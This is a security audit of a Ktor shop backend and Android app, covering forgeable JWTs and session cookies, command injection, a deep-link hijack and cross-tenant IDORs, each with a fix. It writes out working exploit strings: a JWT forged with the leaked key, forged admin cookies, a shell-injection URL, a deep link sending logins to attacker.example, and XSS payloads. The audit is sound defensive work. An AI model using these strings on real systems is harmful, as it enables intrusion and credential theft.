# Security audit — ShopBackend + ShopManager app

**Date:** 2026-08-16
**Scope:** `ShopBackend` (Kotlin/Ktor, branch `feature/asterisk-phone-system` @ `fb03217`) and
`ShopManager` Android app (`C:\Users\krest\AndroidStudioProjects\ShopManager`, versionCode 55).
**Method:** manual source review of auth, tenant isolation, route authorisation, injection sinks,
secret handling, and the Android client's network/IPC surface.

> ⚠️ **This document describes unfixed vulnerabilities, including working exploit strings.**
> Keep it out of any public remote until the criticals are closed. If `origin` is a public repo,
> hold this file locally (or add it to `.gitignore`) rather than committing it.

---

## Executive summary

| Severity | Count | Theme |
|---|---|---|
| Critical | 4 | Forgeable auth tokens, forgeable admin sessions, RCE on the phone server, app backend hijack via deep link |
| High | 7 | Hardcoded admin password, cross-tenant IDOR (×5), control-plane tenant→platform escalation |
| Medium | 8 | 2-year token lifetime, CSRF, app backup exposure, cleartext/plain-SIP, unscoped object IDs, committed DBs, internal-secret handling, missing phone validation |
| Low | 4 | Weak booking token, no rate limiting, no minification, WebView third-party cookies |

The four criticals are independent full-compromise paths, and #1 + #2 together mean **every
authorisation check in the codebase is currently advisory** — a client can assert any identity it
likes. Fix those two first; several of the High IDORs matter far less once identity is real, but
they still need fixing because a legitimately-authenticated tenant can use them against other
tenants.

**Suggested order:** C1 → C2 → C3 → C4 → H5 → H6-H10 → H11 → the Mediums.

---

## CRITICAL

### C1. Hardcoded JWT signing secret (`"very-secret"`)

**Where**
- `src/main/kotlin/JwtConfig.kt:10` — `private const val secret = "very-secret"`
- `src/main/kotlin/FinancialReports.kt:589` — the same literal, duplicated in `validateMobileToken`

**Problem**
`.env.example` documents `JWT_SECRET` as *"must be set in production"*, but **no code path ever
reads that variable**. The signing key is a compile-time constant in a repo, so the operator
believes the secret is configured when it is not.

**Impact**
Anyone able to read the source (or guess the string) can mint tokens with arbitrary claims:

```
JWT.create()
  .withAudience("mobile").withIssuer("shop-manager")
  .withClaim("userId", <any>).withClaim("role", "manager")
  .withClaim("tokenVersion", <matching>).withClaim("ownerId", <any tenant>)
  .sign(Algorithm.HMAC256("very-secret"))
```

That is complete authentication bypass on every `authenticate("jwt")` route, for every tenant.
The token-version revocation check in `JwtConfig.validate` is bypassed by setting `tokenVersion`
to whatever the DB holds (or 0 for fallback accounts).

**Fix**
1. Read the secret from env in **both** places, with a hard startup failure when absent:
   ```kotlin
   private val secret: String = System.getenv("JWT_SECRET")?.takeIf { it.length >= 32 }
       ?: error("JWT_SECRET is not set (min 32 chars) — refusing to start")
   ```
2. Delete the duplicate in `FinancialReports.kt` and have it call a single shared verifier
   (see also H6 — that verifier should do the token-version check too).
3. Generate a real secret on the edge box: `openssl rand -base64 48` → `backend.env`.

**Operational note:** this invalidates every issued token. All manager/shop phones must log in
again. Plan it with the same window as C2.

---

### C2. Session cookies are neither signed nor encrypted

**Where** `src/main/kotlin/ShopBackend.kt:200-205`

```kotlin
install(Sessions) {
    cookie<WebAdmin.AdminSession>("ADMIN_SESSION")
    cookie<WebAdmin.OwnerSession>("OWNER_SESSION")
    cookie<WebAdmin.ImpersonationSession>("IMPERSONATION_SESSION")
    cookie<SetupAppRoutes.SetupAppSession>("SETUP_APP_SESSION")
}
```

**Problem**
Ktor's `cookie<T>(name)` with no `transform { ... }` block serialises the session object as
plaintext into the cookie value with **no MAC and no encryption**. The client can author it.

**Impact**
```
Cookie: ADMIN_SESSION=username=admin
```
…is a valid platform-admin session. Likewise `OWNER_SESSION=ownerId=7&ownerName=x` and
`IMPERSONATION_SESSION=ownerId=7&ownerName=x` grant that tenant's owner portal, and
`SETUP_APP_SESSION=role=admin&userId=0&username=x` grants the handset-provisioning flow.

The entire tenant-isolation design in `TenantContext.kt` — which correctly insists that
"ownerId must always come from the server-side auth resolution, never from a client-supplied
request parameter" — is defeated, because the cookie *is* a client-supplied parameter.

This is also the enabler for C3.

**Fix**
```kotlin
val sessionKey = hex(System.getenv("SESSION_SIGN_KEY")
    ?: error("SESSION_SIGN_KEY is not set — refusing to start"))

install(Sessions) {
    cookie<WebAdmin.AdminSession>("ADMIN_SESSION") {
        cookie.path = "/"
        cookie.httpOnly = true
        cookie.secure = true                       // once TLS terminates in front of the edge
        cookie.extensions["SameSite"] = "Lax"
        cookie.maxAgeInSeconds = 8 * 3600
        transform(SessionTransportTransformerMessageAuthentication(sessionKey))
    }
    // …same for the other three
}
```
Prefer `SessionTransportTransformerEncrypt` if you'd rather the contents not be readable at all.
Key: `openssl rand -hex 32`.

**Operational note:** logs out all admin/owner web sessions once.

---

### C3. Command injection → RCE on the phone server

**Where**
- `src/main/kotlin/WebAdmin.kt:1404-1406` (the entry point)
- `src/main/kotlin/asterisk/ModemFirmwareUpdater.kt:38`, `:64-68` (the sink)

```kotlin
// WebAdmin.kt:1404
get("/telephony/modem/firmware-status") {
    val port = call.request.queryParameters["port"]?.trim().orEmpty()
    val st = asteriskAdmin.firmwareUpdater.status(port)      // ← unvalidated
```
```kotlin
// ModemFirmwareUpdater.kt
private fun sh(cmd: String) = ProcessBuilder("/bin/bash", "-c", cmd)…
fun isRunning(port: String) = sh("systemctl is-active ${unit(port)}").trim() == "active"
fun status(port: String): Status { val running = isRunning(port); … }
private fun unit(port: String) = "modem-fw-" + port.replace('.', '-').replace(':', '-')
```

**Problem**
`start()` gates on `portRe` before building its command — but `status()` and `isRunning()` do not,
and they are reachable directly via the `firmware-status` route. `unit()` only rewrites `.` and `:`,
leaving `;`, `$( )`, backticks, `&&`, and spaces intact. The in-code comment at line 55-56
("port is regex-validated, so this command string is safe to assemble") is true only of `start()`.

**Impact**
```
GET /telephony/modem/firmware-status?port=x-1;id>/tmp/pwn;%23
```
executes as the backend user, which by design has passwordless `sudo systemctl` / `sudo systemd-run`
(needed for the flash) → trivial root. `logFile(port)` is also built from the same unvalidated
string, giving path traversal on the log read.

Behind the admin session today — but C2 makes that session free, so treat this as
**unauthenticated RCE on the phone/edge box** until C2 lands.

**Fix**
Validate at the boundary of every public method, not just `start()`:
```kotlin
private fun requireValidPort(port: String): String {
    require(portRe.matches(port)) { "Invalid USB port" }
    return port
}
fun isRunning(port: String) = sh("systemctl is-active ${unit(requireValidPort(port))}")…
fun status(port: String): Status { requireValidPort(port); … }
```
Better: drop the shell entirely — `ProcessBuilder("systemctl", "is-active", unit(port))` with an
argv array cannot be injected regardless of validation. Do the same for `activeUnit()` and the
`systemd-run` invocation in `start()`. Have the route return 400 on a rejected port instead of
rendering a page.

---

### C4. Exported deep link silently repoints the app's backend

**Where**
- `app/src/main/AndroidManifest.xml:164-174` — `JoinActivity`, `exported="true"`, `BROWSABLE`,
  scheme `shopmanager`, host `join`
- `app/src/main/java/com/example/shopmanager/tailnet/JoinActivity.kt` (`onCreate`)
- `app/src/main/java/com/example/shopmanager/RetrofitClient.kt` (`setBaseUrl`, `normalize`)

```kotlin
api = data?.getQueryParameter("api")
…
api?.takeIf { it.isNotBlank() }?.let { RetrofitClient.setBaseUrl(this, it) }
```

**Problem**
The `api` parameter of an untrusted deep link becomes the app's persistent API base URL. There is
no origin allowlist, no host validation (`normalize()` only requires an `http://`/`https://`
prefix), and no user confirmation. It is applied **before** the tailnet join, so it persists even
when the join subsequently fails.

**Impact**
Any web page a manager opens on the handset can run
`location = "shopmanager://join?server=evil&key=x&api=http://attacker.example/"`.
The next login POSTs the manager's **username and password in cleartext** to the attacker
(`/api/mobile/login`), and every subsequent request carries the JWT there too.

It also compounds into a malicious-update chain: `ApkDownloader.downloadAndVerify` checks SHA-256
against the manifest fetched from **that same base URL** (`/api/app/version.json`), so a poisoned
base URL yields a self-consistent malicious APK. The app holds `REQUEST_INSTALL_PACKAGES` and
there is no signing-key pinning, so the user is prompted to install attacker code as an update.
`WebAdminActivity` additionally loads that base URL into a WebView with `javaScriptEnabled = true`.

**Fix**
1. Validate the host against an allowlist before accepting it:
   ```kotlin
   private fun isAllowedApiHost(url: String): Boolean = runCatching {
       val u = java.net.URI(url)
       u.scheme in setOf("http", "https") &&
           (u.host.endsWith(".ts.warpfactor.dk") || u.host == "ts.warpfactor.dk")
   }.getOrDefault(false)
   ```
2. Show a confirmation screen naming the server before persisting — onboarding is a rare,
   deliberate act; a silent rewrite is never right.
3. Only call `setBaseUrl` **after** `TailnetManager.joinAndConnect` succeeds, so a failed join
   leaves the previous URL intact.
4. Refuse re-onboarding when a base URL is already set unless the user explicitly resets the app.
5. Independently, pin the update: verify the downloaded APK's signing certificate matches the
   installed app's before handing it to `ApkInstaller` (`PackageManager.getPackageArchiveInfo`
   with `GET_SIGNING_CERTIFICATES`). That closes the update path even if the base URL is wrong.
6. Consider dropping `REQUEST_INSTALL_PACKAGES` unless OTA is genuinely required on every handset.

---

## HIGH

### H5. Hardcoded admin fallback `admin` / `1234`

**Where** `src/main/kotlin/WebAdmin.kt:217-226`, duplicated at `src/main/kotlin/SetupAppRoutes.kt:355-360`

```kotlin
val allowedAdminUsername = envUser ?: "admin"
val expectedHash = "$2a$12$bRyq/…"          // Hash of "1234"
val passwordOk = if (envPass != null) password == envPass
                 else BCrypt.checkpw(password, expectedHash)
```

**Problem/impact** If `ADMIN_PASSWORD` is ever unset (fresh box, typo'd env file, systemd unit
without `EnvironmentFile`), the platform admin is `admin`/`1234` — which also unlocks C3.
Secondary issues: when the env var *is* set the comparison is plaintext `==` (non-constant-time),
and every attempt logs the attempted username at line 228.

**Fix** Remove the fallback hash entirely. Require `ADMIN_USERNAME`/`ADMIN_PASSWORD_HASH` (store a
BCrypt hash, not a plaintext password) and fail startup if missing. Compare with
`MessageDigest.isEqual` on the byte arrays, or just rely on BCrypt's own comparison. Drop the
username from the failure log line.

---

### H6. IDOR — financial exports of any shop in any tenant

**Where** `src/main/kotlin/FinancialReports.kt:843-869` (`export.xlsx`, `export.pdf`)

```kotlin
if (validateMobileToken(call.request.queryParameters["token"]) == null) { … 401 }
val (report, period) = resolveReportMobile(call) ?: …     // uses raw ?shop_id=
```

**Problem** The HTML page (line 643) correctly computes `allowedShopIds` from
`getShopsForManager(userId)` and checks membership. The two export endpoints skip that entirely —
they only check that the token parses. `validateMobileToken` also accepts `role == "shop"` and
performs **no token-version revocation check**, so force-logout does not revoke report access.

**Impact** Any valid mobile JWT — any tenant, manager or shop role, including a revoked one —
can export full revenue/appointment reports for any `shop_id` on the platform.

**Fix** Route both exports through the same `resolveManagerShops` + `allowedShopIds` check as the
HTML page, and add the `tokenVersion` comparison to `validateMobileToken` (share the verifier
with `JwtConfig`). Also stop passing the raw JWT in the query string (`baseParams = "token=$token"`
at line 678) — it lands in access logs, `Referer` headers, and WebView history. Prefer a
short-lived, single-purpose report token.

---

### H7. IDOR — appointments for any shop

**Where** `src/main/kotlin/MobileApi.kt:980-1006`

```kotlin
shopId = if (loginInfo.role == "shop") loginInfo.shopId
         else call.request.queryParameters["shop_id"]?.toIntOrNull()
…
val appointments = db.getAppointmentsForShop(shopId)      // no isAuthorizedForShop
```

**Impact** Any manager reads any shop's appointment book (customer names, times, services) across
tenant boundaries.

**Fix** Insert the standard guard after resolving `shopId`:
```kotlin
if (!isAuthorizedForShop(loginInfo, shopId, db)) {
    return@get call.respond(HttpStatusCode.Forbidden, "Not authorized for this shop")
}
```

---

### H8. IDOR — booking creation in any shop

**Where** `src/main/kotlin/MobileApi.kt:1009-1103` (`POST /api/mobile/manager/booking/create`)

Checks `loginInfo.role != "manager"` (line 1033) but never `isAuthorizedForShop`. The sibling
`create-json` (line 1394) and `create-multi-json` endpoints do it correctly.

**Impact** Any manager writes appointments into any tenant's shop **and** triggers a confirmation
SMS out of that shop's GSM SIM (line 1088) — cross-tenant data write plus billable SMS from
someone else's line.

**Fix** Add the `isAuthorizedForShop(loginInfo, shopId, db)` check alongside the role check.

---

### H9. Unauthenticated booking-token minting → free SMS from real SIMs

**Where**
- `src/main/kotlin/SharedRoutes.kt:122-141` (`POST /api/booking/create`)
- exposed by the public-path list at `src/main/kotlin/WebAdmin.kt:274` (`path.startsWith("/api/booking/")`)

```kotlin
post("/api/booking/create") {
    val shopId = params["shop_id"]?.toIntOrNull()
    val phone  = params["phone"]
    val customerId = db.ensureCustomerByPhone(phone)
    val bookingToken = db.generateBookingToken(customerId, shopId, phone)
    call.respondText("""Book here: $baseUrl/api/book?token=$bookingToken""")
}
```

**Problem** No authentication, no rate limit, arbitrary `shop_id` and `phone`. It creates a
customer row and hands back a valid booking token.

**Impact** An attacker mints a token for any phone number against any tenant's shop, then calls
`/api/booking/submit` → an appointment is created in that shop's calendar **and a confirmation SMS
is sent from the shop's GSM SIM to the attacker-chosen number** (`SharedRoutes.kt:335`). That's
unauthenticated SMS origination at the shop's cost, arbitrary customer-record creation, and
calendar-flooding DoS against any tenant. Repeat at will.

**Fix** This endpoint appears to be a leftover test hook — the real flow mints tokens from the
IVR (`InternalTelephonyRoutes.kt:218`) and from the admin "test booking link" page. Delete it, or
move it behind admin auth by removing it from the public-path list. Separately, add a per-shop
outbound-SMS rate limit / daily cap in `SmsQueue` as defence in depth, since SMS costs money.

---

### H10. Cross-tenant customer read and write

**Where** `src/main/kotlin/MobileApi.kt:531-548` (GET) and `:595-615` (PUT)

```kotlin
// GET — shop is authorised, but the customer is not linked to it
val customer = db.getCustomerById(customerId) ?: … 404
val appts    = db.getAppointmentsForCustomer(customerId, shopId = shopId)   // filtered
call.respond(CustomerDetailResponse(customer, appts))                       // customer is NOT
```
```kotlin
// PUT — no linkage check at all
db.getCustomerById(customerId) ?: … 404
db.updateCustomerEditable(customerId, body.name, body.status, body.payment, body.language)
```

**Problem** `isAuthorizedForShop(shopId)` passes trivially (the caller uses their *own* shop), but
`customerId` is unconstrained. The `PATCH …/name` variant at line 581 gets this right —
it verifies the customer has appointments at the shop — and the `GET`/`PUT` don't.

**Impact** Enumerate every customer in the platform (name, phone, status) by walking `customerId`;
overwrite any customer record, including flipping `status` off "New" — which, per
`InternalTelephonyRoutes.kt:108`, promotes a caller to "known" and changes another tenant's IVR
routing for that number.

**Fix** Apply the same linkage check the `/name` endpoint uses to both `GET` and `PUT`, or
(better) add a proper `customer.owner_id` column and filter on the caller's tenant.

---

### H11. Control plane — tenant edge token escalates to platform

**Where** `src/main/kotlin/controlplane/ControlPlaneRoutes.kt`

**a) APK overwrite (line 196-215).** `POST /api/onboarding-apk` has no `edgeOwnerKey` scoping —
every other node-touching route calls `callMayManageNode`, this one doesn't. Any *single* tenant's
edge token overwrites `/opt/control-plane/apk/shopmanager.apk`, which is the APK served to
**every** newly-onboarded phone on the platform, for all tenants. Only a `size < 100_000` sanity
check stands in the way.
→ *Fix:* restrict to the admin token (`call.attributes.getOrNull(edgeOwnerKey) == null`), and
verify the uploaded APK's signing certificate before the atomic move.

**b) Stored XSS in the admin UI (line 307-313).** `load()` builds tables with `innerHTML` from
`x.name`, `x.user`, `x.tags` — and tags/labels originate from `deviceLabel` on
`POST /api/invites`, which an edge token controls. A tenant plants
`<img src=x onerror=…>` and executes JavaScript in the platform admin's page, where `TOK`
(the admin token) is in scope.
→ *Fix:* build rows with `textContent`/`createElement`, or escape before interpolation.
Also validate `deviceLabel` server-side.

**c) Reflected XSS via `?token=` (line 220, 253, 277, 318).**
`escapeJs` escapes `\` and `"` but not `</script>`, and the result is emitted through
`unsafe { raw(js(tok)) }`. When the control plane runs with no credential configured
(`token == null && edgeTokens.isEmpty()` → the guard at line 105 returns early),
`GET /?token=</script><script>…` executes.
→ *Fix:* additionally replace `<` with `\u003C` in `escapeJs`, or emit the token as a
`<script type="application/json">`-free data attribute and read it from the DOM.

**d)** Token comparison at line 108 (`presented == token`) is non-constant-time.

---

## MEDIUM

### M12. Token lifetime is effectively two years, and revocation fails open
`src/main/kotlin/JwtConfig.kt:39` sets `acceptExpiresAt(365 days)` **on top of** the 365-day
expiry issued at line 84 — a stolen token works for ~2 years. Worse, `:52-57` catches DB errors
during the token-version check and returns `0`, "fail-open so a transient error doesn't lock
everyone out" — meaning a DB hiccup re-validates every force-logged-out token whose JWT claim is 0.
**Fix:** issue 30-day tokens with a refresh flow, drop the leeway to minutes, and fail *closed*
on DB errors (a 503 is safer than honouring a revoked session).

### M13. No CSRF protection; destructive admin actions are `GET`
No CSRF tokens anywhere in `WebAdmin.kt`, and the session cookies set no `SameSite` (see C2 fix).
Deletions are plain `GET` links: `/managers/delete` (`:796`), `/shops/delete` (`:913`),
`/employees/delete` (`:1760`), `/services/delete` (`:2016`), `/customers/delete` (`:2753`),
`/admin/switch-owner/{ownerId}` (`:3063`), `/employees/services/unassign` (`:1924`),
`/unassign-service` (`:2162`), plus the owner-portal equivalents.
Because browsers default to `SameSite=Lax`, a top-level navigation (a link the admin clicks)
still carries the cookie.
**Fix:** convert every mutating action to `POST`, add a per-session CSRF token to each form and
verify it, and set `SameSite=Strict` on the admin cookies.

### M14. App: session data is cloud-backed and unencrypted
`AndroidManifest.xml:43` sets `allowBackup="true"` with `backup_rules.xml` and
`data_extraction_rules.xml` left as empty templates, and the JWT lives in plain
`SharedPreferences("shopmanager")` under `jwt_token` (`MainActivity.kt:96,132`), alongside `role`
and the edge base URL. SIP passwords are fetched per session but the JWT alone is full account access.
**Fix:** either `allowBackup="false"` (simplest for a self-distributed fleet app), or add explicit
`<exclude domain="sharedpref" path="shopmanager.xml"/>` to both rule files. Move the token to
`EncryptedSharedPreferences` — `androidx.security:security-crypto` is already a dependency.

### M15. Cleartext HTTP and unauthenticated-transport SIP
`app/src/main/res/xml/network_security_config.xml` permits cleartext to `192.168.0.177` and
`192.168.0.192` — plain LAN, *not* inside the WireGuard tunnel — as well as the MagicDNS domains.
`sip/SipEngine.kt:183,218` registers with `TransportType.Udp`; no TLS, no SRTP.
On the LAN path, the JWT, the SIP credentials returned by `/api/mobile/telephony/sip-credentials`,
and all call audio are in the clear.
**Fix:** drop the two LAN IP entries once every handset reaches the edge over the tailnet; if LAN
access must stay, terminate TLS on the edge and remove the cleartext exemption. For SIP, move to
TLS + SRTP (`TransportType.Tls`, `Core.mediaEncryption = MediaEncryption.SRTP`) or accept the
tailnet as the only transport and document that the LAN path is unsupported.

### M16. Unscoped object IDs
- `MobileApi.kt:1341-1356` — `DELETE …/blacklist/{entryId}`: `shopId` is authorised, then
  `db.removeBlacklistEntryById(entryId)` runs on any entry in any tenant.
- `MobileApi.kt:782-788` — `DELETE /api/mobile/device-token?token=` deletes any device token
  globally with no ownership check (push-wake denial for other managers).
- `MobileApi.kt:1186-1202` — `GET …/services?employee_id=` returns services for any employee id,
  no shop or tenant scoping.

**Fix:** in each case verify the child object belongs to the caller's shop/tenant before acting
(`removeBlacklistEntryById` → add a `shopId` parameter to the `WHERE` clause; device-token delete
→ scope to `(ref_type, ref_id)` from the JWT).

### M17. SQLite databases committed to git
`ShopManager.db` and `data/ShopBackend.db` are tracked, across 11 commits. Current contents are
test data, but they include a manager username (`jiji`) and its BCrypt hash, plus shop/customer rows.
`.gitignore` already excludes `data/ShopManager_*.db` backups — the primaries slipped through.
**Fix:** `git rm --cached ShopManager.db data/ShopBackend.db`, add both to `.gitignore`, and
rotate that manager's password. Purging history is optional given the contents look like test data —
decide based on whether any of those 11 commits ever held live customer rows.

### M18. Internal telephony secret: query-string transport, non-constant-time compare
`src/main/kotlin/asterisk/InternalTelephonyRoutes.kt:48-56` accepts `secret` from
`request.queryParameters` as a fallback and compares with `!=`. The query form ends up in access
logs and any proxy in front. (The blank-secret check correctly denies — good.)
**Fix:** accept the secret only as a form field or an `Authorization` header, and compare with
`MessageDigest.isEqual`. Bind these routes to `127.0.0.1` if the dialplan is always co-located.

### M19. No phone-number validation → AMI header / CLI argument injection
`src/main/kotlin/telephony/SmsRoutes.kt:124` only rejects a blank `toPhone`. It flows to
`AmiClient.sendSms` (`src/main/kotlin/asterisk/AmiClient.kt:179-201`), where the **message** is
CRLF-sanitised but the **number** is not — it goes straight into the AMI `Number:` header, and
unquoted into the CLI fallback string `quectel sms send $trunkName $toNumberE164 "$cliMessage"`.
**Fix:** validate against `^\+?[0-9]{4,15}$` at the API boundary and again in `AmiClient.sendSms`.

---

## LOW

- **L20. Weak booking token.** `DataBase.kt:1889` — `UUID.randomUUID().…take(12)` = 48 bits of
  entropy for a token that grants access to a customer's booking flow. Mitigated by the 1-hour TTL
  and single use (`getBookingTokenInfo`, `:1763`). Use the same
  `SecureRandom(24 bytes) → Base64url` approach as `createInstallToken` (`:1824`).
- **L21. No rate limiting** on `/login`, `/owner-login`, `/setup-app/login`, or
  `/api/mobile/login`. Add a per-IP/per-username throttle with backoff.
- **L22. `isMinifyEnabled = false`** in the release build (`app/build.gradle.kts`) — no
  obfuscation or shrinking on a self-distributed APK.
- **L23. WebView** (`WebAdminActivity.kt:45-47`) enables `setAcceptThirdPartyCookies(true)`;
  not needed for a same-origin admin UI.
- **L24. Log hygiene.** `WebAdmin.kt:228` logs attempted usernames on failed logins;
  `MainActivity.kt:137` logs the first 20 chars of the JWT; `JoinActivity.kt:57` logs the
  pre-auth key prefix and the api URL to logcat.

---

## Verification checklist (after fixes)

- [ ] Start the backend with `JWT_SECRET` unset → refuses to start. Same for `SESSION_SIGN_KEY`
      and `ADMIN_PASSWORD_HASH`.
- [ ] `curl -H 'Cookie: ADMIN_SESSION=username=admin' http://edge:8080/` → redirects to `/login`.
- [ ] Token forged with `HMAC256("very-secret")` → 401 on `/api/mobile/me`.
- [ ] `GET /telephony/modem/firmware-status?port=x-1;id>/tmp/pwn;%23` → 400, `/tmp/pwn` absent.
- [ ] `adb shell am start -a android.intent.action.VIEW -d "shopmanager://join?server=e&key=k&api=http://evil.test/"`
      → rejected or confirmation-gated; `RetrofitClient.currentBaseUrl` unchanged.
- [ ] Manager A's token on `GET /api/mobile/manager/appointments?shop_id=<B's shop>` → 403.
      Same for `export.xlsx?shop_id=`, `booking/create`, `customers/{id}` GET+PUT,
      `blacklist/{entryId}`.
- [ ] `POST /api/booking/create` → 404/401 (endpoint removed or authenticated).
- [ ] Edge token for tenant 1 on `POST /api/onboarding-apk` → 403.
- [ ] Device label `<img src=x onerror=alert(1)>` renders as text in the control-plane node table.
- [ ] `adb backup` / device-transfer of the app yields no `jwt_token`.
- [ ] `git ls-files | grep '\.db$'` → empty.

---

## Not reviewed / out of scope

- Asterisk's own configuration (`pjsip.conf`, `quectel.conf`, AMI/ARI ACLs) as deployed on the
  phone server — only the generators in `src/main/kotlin/asterisk/*ConfigWriters.kt` were read.
  Those write with mode-600 temp files and atomic rename, which is correct.
- Headscale ACL policy content.
- Third-party dependency CVE scan (Ktor 2.3.7, linphone-sdk 5.5.11, OkHttp 4.9.3, Retrofit 2.9.0,
  POI 5.2.5, openpdf 1.3.35 — several are 1-2 years behind; worth an
  `./gradlew dependencyCheckAnalyze` pass).
- `src/old-chat-bot/**` (not compiled into the running server).
- Physical/OS hardening of the edge and control-plane boxes.
